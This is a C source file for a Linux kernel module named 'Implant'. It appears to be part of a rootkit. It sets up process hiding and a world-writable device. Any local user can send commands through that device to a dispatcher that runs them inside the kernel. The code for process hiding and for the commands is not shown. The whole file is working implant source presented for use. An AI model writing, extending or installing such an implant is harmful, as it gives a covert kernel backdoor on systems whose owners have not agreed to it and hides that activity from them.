#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/string.h>

#include "hide_proc.h"
#include "commands.h"
#include "log.h"

MODULE_DESCRIPTION("Implant");
MODULE_AUTHOR("sc");
MODULE_LICENSE("GPL");

#ifndef IMPLANT_DEVICE_NAME
#define IMPLANT_DEVICE_NAME "implant"
#endif

#ifndef IMPLANT_CLASS_NAME
#define IMPLANT_CLASS_NAME "implant"
#endif

static int implant_major;
static struct class *implant_class = NULL;
static struct device *implant_device = NULL;

static ssize_t implant_dev_read(struct file *fp, char __user *buf, size_t len,
				loff_t *offset);
static ssize_t implant_dev_write(struct file *fp, const char *buf, size_t len,
				 loff_t *offset);

struct file_operations fops = { .read = implant_dev_read,
				.write = implant_dev_write };

static ssize_t implant_dev_read(struct file *fp, char __user *buf, size_t len,
				loff_t *offset)
{
	return 0;
}

static ssize_t implant_dev_write(struct file *fp, const char *buf, size_t len,
				 loff_t *offset)
{
	int ret = 0;
	char *args_buf = kcalloc(len + 1, sizeof(char), GFP_KERNEL);
	char **argv;
	int argc = 0;

	if (!args_buf) {
		printk(KERN_WARNING "%s: Failed to allocate command buffer",
		       THIS_MODULE->name);
		ret = -ENOMEM;
		goto err;
	}

	ret = copy_from_user(args_buf, buf, len);
	if (ret) {
		ret = -ret;
		goto err_free_buf;
	}

	argv = argv_split(GFP_KERNEL, args_buf, &argc);
	if (!argv) {
		ret = -ENOMEM;
		goto err_free_buf;
	}

	commands_dispatch(argc, argv);

	argv_free(argv);
	ret = len;

err_free_buf:
	kfree(args_buf);
err:
	return ret;
}

static char *implant_devnode(struct device *dev, umode_t *mode)
{
	if (!mode) {
		return NULL;
	}

	if (dev->devt == MKDEV(implant_major, 0)) {
		*mode = 0666;
	}

	return NULL;
}

static int __init implant_init(void)
{
	int ret = 0;

	IMLOG_INFO("Loaded\n");

	ret = hide_proc_init();

	if (ret) {
		goto err;
	}

	implant_major = register_chrdev(0, IMPLANT_DEVICE_NAME, &fops);
	if (implant_major < 0) {
		ret = implant_major;
		goto err;
	}

	IMLOG_INFO("Registered with major %d\n", implant_major);

	implant_class = class_create(THIS_MODULE, IMPLANT_CLASS_NAME);
	if (IS_ERR(implant_class)) {
		ret = PTR_ERR(implant_class);
		goto err_unreg_dev;
	}
	IMLOG_INFO("Device class registered\n");
	/* override permission */
	implant_class->devnode = implant_devnode;

	implant_device =
		device_create(implant_class, NULL, MKDEV(implant_major, 0),
			      NULL, IMPLANT_DEVICE_NAME);
	if (IS_ERR(implant_device)) {
		ret = PTR_ERR(implant_device);
		goto err_destroy_class;
	}
	IMLOG_INFO("Device class created\n");

	return 0;

err_destroy_class:
	class_destroy(implant_class);
err_unreg_dev:
	unregister_chrdev(implant_major, IMPLANT_DEVICE_NAME);
err:
	return ret;
}

static void __exit implant_exit(void)
{
	hide_proc_exit();

	device_destroy(implant_class, MKDEV(implant_major, 0));
	class_destroy(implant_class);
	unregister_chrdev(implant_major, IMPLANT_DEVICE_NAME);

	IMLOG_INFO("Unloaded\n");
}

module_init(implant_init);
module_exit(implant_exit);
